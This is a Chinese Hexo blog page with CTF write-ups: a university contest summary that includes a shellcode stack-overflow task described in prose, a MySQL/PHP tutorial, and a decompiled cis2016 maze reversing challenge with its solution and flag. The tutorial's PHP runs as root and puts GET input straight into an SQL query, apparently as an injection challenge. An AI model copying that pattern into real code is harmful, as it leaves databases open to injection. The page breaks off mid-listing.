<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="utf-8">
  

  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://yoursite.com/page/4/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="default">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Hexo">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css">
</head>
</html>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-NUST" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/07/29/NUST/" class="article-date">
  <time datetime="2019-07-28T17:11:01.728Z" itemprop="datePublished">2019-07-29</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/二进制/">二进制</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/07/29/NUST/">南理校赛二进制wp</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="NUST面向大一的比赛"><a href="#NUST面向大一的比赛" class="headerlink" title="NUST面向大一的比赛"></a>NUST面向大一的比赛</h1><p>总体来说不是很难,大师傅们难度控制的也很好,有难有易.</p>
<ul>
<li>大体上考察了逆向的基础,还有别的知识,例如base编码,阅读简单算法,混淆与patch.</li>
<li>pwn的话,一个写入shellcode的栈题,还有一个babyheap…(GG)</li>
</ul>
<h1 id="re200"><a href="#re200" class="headerlink" title="re200"></a>re200</h1><p>魔改了base64,写出对应算法和替换表即可.</p>
<h1 id="re270"><a href="#re270" class="headerlink" title="re270"></a>re270</h1><p>很简单的maze,但是要找好方向,还有多解问题,但是只有一组解才能打印出正确的答案,当时被w和s坑的不浅…</p>
<h1 id="re320"><a href="#re320" class="headerlink" title="re320"></a>re320</h1><p>一个exe和dll,全是C#写的,其中exe被加了加密壳.反编译无果,考虑dll是否有猫腻,果然有明显的数据痕迹,patch数据即可.</p>
<h1 id="pwn200"><a href="#pwn200" class="headerlink" title="pwn200"></a>pwn200</h1><p>get了一个字符串,没有canary,栈可执行,但是栈的长度只有22 ???,哪有那么短的shellcode,后发现,还有吧shellcode写越界的操作,直接伪造新的函数帧栈,覆盖返回地址,执行shellcode.</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/07/29/NUST/" data-id="cjyn83qdx0004icthrtml6yp9" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-MYSQL" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/07/29/MYSQL/" class="article-date">
  <time datetime="2019-07-28T17:11:01.724Z" itemprop="datePublished">2019-07-29</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/WEB/">WEB</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/07/29/MYSQL/">网站开发入门-MYSQL数据库的基础使用</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h1><p>直接进入主题<br>MYSQL数据库的结构大概就是 库–&gt;表单–&gt;行列等等,那么管理使用数据库,就需要一门结构化查询语言(Structured Query Language)简称SQL.<br>从0开始,若想使用数据库,首先要建立一个库,于是有了</p>
<blockquote>
<p>CREATE DATABASE test<br> DROP DATABASE test</p>
</blockquote>
<p>然后是新建表单.表(Table)由行集合构成,一行是列的序列(集合)，每列与行对应一个数据项.</p>
<blockquote>
<p>CREATE TABLE 表名称<br>(<br>    列名称1 数据类型,<br>    列名称2 数据类型,<br>    列名称3 数据类型,<br>    ….<br>)</p>
</blockquote>
<p>sql里的数据类型,和一般语言(PHP C python)表示有些不同.详见下图.<br><img src="/image/sql.jpg" alt><br>在PHP中,调用sql数据库的方法大概如下:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$con = mysql_connect(<span class="string">"localhost:3306"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);</span><br><span class="line">mysql_select_db(<span class="string">'wcy'</span>);</span><br><span class="line"><span class="keyword">if</span> (!$con)</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">'Could not connect: '</span> . mysql_error());</span><br><span class="line">  &#125;</span><br><span class="line">$a = @$_GET[<span class="string">'a'</span>];</span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"select flag from ctf1 where id='$a'"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'your sql:'</span>.$sql.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">$b = @mysql_fetch_array(mysql_query($sql));</span><br><span class="line"><span class="keyword">echo</span> $b[<span class="number">0</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>&gt;</span></span><br></pre></td></tr></table></figure>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/07/29/MYSQL/" data-id="cjyn83qe6000iicthi02evdz0" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-maze" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/07/29/maze/" class="article-date">
  <time datetime="2019-07-28T17:11:01.717Z" itemprop="datePublished">2019-07-29</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/RE/">RE</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/07/29/maze/">cis2016-re300-maze</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="初探maze"><a href="#初探maze" class="headerlink" title="初探maze"></a>初探maze</h1><ul>
<li>又遇到了maze,难度比bugku的take the maze简单一点,但是比nctf和nust的maze要复杂好多.</li>
<li>运行发现,传参形式为命令行.错误会报错play again!</li>
<li>IDA打开,查看主函数,很简短</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **input, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( argc != <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(byte_13C0AA8, <span class="number">-1</span>, <span class="number">484u</span>);</span><br><span class="line">    sub_13B10B0();</span><br><span class="line">    sub_13B1000();</span><br><span class="line">    <span class="keyword">if</span> ( sub_13B1150(input[<span class="number">1</span>]) )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_13B1290((<span class="keyword">void</span> *)input[<span class="number">1</span>]);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"play again!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>大概意思就是检测输入是否为空,非空则进入判断,首先memset一个484的内存空间,紧接着的两个函数对byte_13C0AA8操作.</li>
</ul>
<p>查看sub_13B1290验证函数,函数具体如下图.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_401150</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *input)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *input_1; <span class="comment">// edx@1</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@2</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// al@3</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// ebx@3</span></span><br><span class="line">  <span class="keyword">int</span> Y; <span class="comment">// ecx@3</span></span><br><span class="line">  <span class="keyword">int</span> X; <span class="comment">// esi@3</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v7; <span class="comment">// edi@3</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// ebp@4</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v9; <span class="comment">// edx@7</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v10; <span class="comment">// ebx@8</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v11; <span class="comment">// eax@11</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// [sp+4h] [bp-4h]@3</span></span><br><span class="line"></span><br><span class="line">  input_1 = input;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(input) &amp; <span class="number">1</span> )                      <span class="comment">// 奇数</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v3 = *input;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  Y = <span class="number">0</span>;</span><br><span class="line">  X = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">-1</span>;</span><br><span class="line">  v12 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !*input )</span><br><span class="line">    <span class="keyword">goto</span> gg;</span><br><span class="line">  v8 = <span class="number">0</span>;                                       <span class="comment">// </span></span><br><span class="line">                                                <span class="comment">// </span></span><br><span class="line">                                                <span class="comment">// </span></span><br><span class="line">                                                <span class="comment">// </span></span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &lt; <span class="string">'a'</span> || v3 &gt; <span class="string">'d'</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">    v9 = input_1[<span class="number">1</span>] - <span class="number">101</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v9 &gt; <span class="number">0x15</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      input_1 = input;</span><br><span class="line">LABEL_17:</span><br><span class="line">      ++v4;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">    &#125;</span><br><span class="line">	v10 = v7;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'a'</span>:</span><br><span class="line">        v7 = <span class="number">0</span>;</span><br><span class="line">        X = (X - v9) % <span class="number">22</span>;</span><br><span class="line">        v8 = *(&amp;byte_410AA8[<span class="number">22</span> * Y] + X);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">		</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'b'</span>:</span><br><span class="line">        v7 = <span class="number">0</span>;</span><br><span class="line">        X = (v9 + X) % <span class="number">22</span>;</span><br><span class="line">        v8 = *(&amp;byte_410AA8[<span class="number">22</span> * Y] + X);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">		</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'c'</span>:</span><br><span class="line">        v7 = <span class="number">1</span>;</span><br><span class="line">        Y = (Y - v9) % <span class="number">22</span>;</span><br><span class="line">        v8 = *(&amp;byte_410AA8[<span class="number">22</span> * Y] + X);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">		</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'d'</span>:</span><br><span class="line">        v7 = <span class="number">1</span>;</span><br><span class="line">        Y = (v9 + Y) % <span class="number">22</span>;</span><br><span class="line">        v8 = *(&amp;byte_410AA8[<span class="number">22</span> * Y] + X);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">		</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">    *(&amp;byte_410AA8[<span class="number">22</span> * Y] + X) = <span class="number">0</span>;</span><br><span class="line">    v4 += (v8 ^ <span class="number">1</span>) + (v10 == v7);</span><br><span class="line">    input_1 = input;</span><br><span class="line"></span><br><span class="line">LABEL_18:</span><br><span class="line">    v3 = input_1[<span class="number">2</span>];</span><br><span class="line">    input_1 += <span class="number">2</span>;</span><br><span class="line">    input = input_1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v3 );                                 <span class="comment">// </span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( Y != <span class="number">21</span> || X != <span class="number">21</span> )</span><br><span class="line">gg:</span><br><span class="line">    ++v4;</span><br><span class="line">  result = v4 &lt; <span class="number">0</span>;</span><br><span class="line">  LOBYTE(result) = v4 &lt;= <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>那么byte_13C就是地图了,而且可以顺便判断出switch语句中的abcd,还有地图规模为24 * 24,并且可以看出X,Y值.</li>
<li>在patch程序后,成功dump地图.</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">------------------------------------------------------------------------&gt;x</span><br><span class="line">|  .  .  .  .  .  .  .  .  .  #  .  .  #  .  .  .  .  .  .  .  .  .</span><br><span class="line">|  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .</span><br><span class="line">|  .  .  .  .  .  .  .  .  .  .  #  .  .  .  .  .  .  .  .  .  .  .</span><br><span class="line">|  .  .  .  .  .  .  .  .  #  .  .  .  .  .  .  .  .  #  .  .  .  .</span><br><span class="line">|  #  .  .  .  .  .  .  .  .  .  .  .  .  .  #  .  .  .  .  .  .  .</span><br><span class="line">|  .  .  .  .  .  .  .  .  .  .  .  .  .  #  .  .  .  .  .  .  .  .</span><br><span class="line">|  .  .  .  .  .  .  .  .  .  .  .  .  .  .  #  .  .  .  .  .  .  .</span><br><span class="line">|  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  #  .  .  .</span><br><span class="line">|  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  #  .  .</span><br><span class="line">|  .  .  .  .  .  .  .  #  .  .  .  .  .  .  .  .  .  .  .  .  #  .</span><br><span class="line">|  .  .  .  #  .  .  #  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .</span><br><span class="line">|  .  .  .  .  .  .  .  .  #  .  .  .  .  .  .  #  .  .  .  .  .  .</span><br><span class="line">|  #  .  .  .  .  .  .  .  .  .  .  .  .  .  #  .  #  .  .  .  .  .</span><br><span class="line">|  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .</span><br><span class="line">|  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .</span><br><span class="line">|  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .</span><br><span class="line">|  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  #  .</span><br><span class="line">|  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .</span><br><span class="line">|  .  .  .  .  .  #  .  .  .  .  .  .  .  .  .  .  .  .  #  .  .  .</span><br><span class="line">|  #  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  #  .  .  .  .</span><br><span class="line">|  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .</span><br><span class="line">|  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  #  .  .  .  .  .  #</span><br><span class="line">|</span><br><span class="line">|                                      (我事先替换好了0-&gt;. , 1-&gt;#)</span><br><span class="line">|</span><br><span class="line">V   y</span><br></pre></td></tr></table></figure>

<ul>
<li>居然没有显而易见的路径供我们走….. 这是个啥玩意儿啊 _(:з」∠)_</li>
</ul>
<h1 id="深入分析"><a href="#深入分析" class="headerlink" title="深入分析"></a>深入分析</h1><ul>
<li><p>首先(strlen(input)&amp;1),再一次判断输入是否为0,而且我们可知,strlen为奇数,详情请见位运算hhhhhhh.</p>
</li>
<li><p>比较重要的do-while循环,如果v3(input[i])非方向键,那么指针会整体后移.如果奇数位都非方向键,那么GG</p>
</li>
<li><p>所以可以确定,方向键和位移数,分别在奇数位和偶数位.</p>
</li>
<li><p>那么按正常情况分析,首先猜测为位移数的对应字母,先减去101, 由if(v9&gt;21)的判断区,结合地图为22*22正方形,下面的%22和&amp;([22*y] + x),可知,这是在限定地图边界.</p>
</li>
<li><p>分析主要的switch case可知,a和b是点在X方向的位移,c和d是点在Y方向的位移.</p>
</li>
<li><p>左右方向时,会将0赋值给v7,上下时,会将1赋值给v7.</p>
</li>
<li><p>移动后会将对应位设置为0 , v4不能为负数,所以条件v8必须为1,即为’#’,v10 != v7.所以方向不能重复.</p>
</li>
<li><p>综上分析,方向键不能重复为ab或cd.</p>
</li>
<li><p>由上图可知,d19 b17 c16 a9 d8 b7 d10 b6  按照对应关系有  dxbvcuandmbldobk</p>
</li>
</ul>
<blockquote>
<p>C:\Users\wangchenyu\Downloads&gt;DC9A4EBEF8F3A11A0D97946F6EBB6640.exe dxbvcuandmbldobk<br>Congratulations!  flag{Y0u_4re_4_G00d_Ma2e_Runner}.</p>
</blockquote>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul>
<li><p>在做题的过程中,我dump下来了6个不同的地图,但是我们可以知道,flag是唯一的,而且在生成地图的时候我也发现了srand和rand函数对地图的操作</p>
</li>
<li><p>虽然地图不同,但是可以轻易的得知,走法都是一样的,不同的其实都是一些无用点,那么他是怎么实现的呢,来分析一下生成maze的函数.</p>
</li>
<li><p>memset一块内存大小为484的地图空间</p>
</li>
</ul>
<p>函数1</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sub_13010B0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// ecx@1</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// esi@1</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// edx@2</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax@2</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// esi@4</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// edx@5</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v6; <span class="comment">// eax@6</span></span><br><span class="line">  <span class="keyword">char</span> *v7; <span class="comment">// ecx@6</span></span><br><span class="line">  <span class="keyword">char</span> *v8; <span class="comment">// eax@10</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v9; <span class="comment">// ecx@10</span></span><br><span class="line"></span><br><span class="line">  v0 = dword_130FF38[<span class="number">0</span>];</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( dword_130FF38[<span class="number">0</span>] != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = dword_130FF38[<span class="number">0</span>];</span><br><span class="line">    v3 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      ++v1;</span><br><span class="line">      *(&amp;byte_1310AA8[<span class="number">22</span> * v2] + dword_130FF3C[v3]) = <span class="number">1</span>;</span><br><span class="line">      v3 = <span class="number">2</span> * v1;</span><br><span class="line">      v2 = dword_130FF38[<span class="number">2</span> * v1];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v2 != <span class="number">-1</span> );</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v0 != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v6 = <span class="number">0</span>;</span><br><span class="line">      v7 = &amp;byte_1310AA8[<span class="number">22</span> * v0];</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v7[v6] == <span class="number">-1</span> )</span><br><span class="line">          v7[v6] = <span class="number">0</span>;</span><br><span class="line">        ++v6;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v6 &lt; <span class="number">22</span> );</span><br><span class="line">      v8 = &amp;byte_1310AA8[dword_130FF3C[v5]];</span><br><span class="line">      v9 = <span class="number">22</span>;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( *v8 == <span class="number">-1</span> )</span><br><span class="line">          *v8 = <span class="number">0</span>;</span><br><span class="line">        v8 += <span class="number">22</span>;</span><br><span class="line">        --v9;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v9 );</span><br><span class="line">      v5 = <span class="number">2</span> * ++v4;</span><br><span class="line">      v0 = dword_130FF38[<span class="number">2</span> * v4];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v0 != <span class="number">-1</span> );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>函数2</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> <span class="keyword">int</span> <span class="title">sub_1301000</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// ecx@1</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// edx@1</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// eax@2</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// eax@4</span></span><br><span class="line">  <span 